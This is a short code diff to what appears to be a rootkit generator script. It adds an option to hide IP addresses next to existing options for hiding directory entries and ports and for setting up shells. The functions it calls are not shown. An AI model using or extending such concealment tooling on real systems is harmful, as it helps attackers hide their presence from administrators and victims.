@@ -44,8 +44,14 @@ if "hideme" in rootkit.keys():
 if "hide_dent" in rootkit.keys():
     generator.hide_dent(rootkit["hide_dent"])
 
+hide_port_hook = False
+
 if "hide_port" in rootkit.keys():
     generator.hide_port(rootkit["hide_port"])
+    hide_port_hook = True
+
+if "hide_ip" in rootkit.keys():
+    generator.hide_ip(rootkit["hide_ip"], hide_port_hook)
 
 if "shells" in rootkit.keys():
     generator.shells(rootkit["shells"])
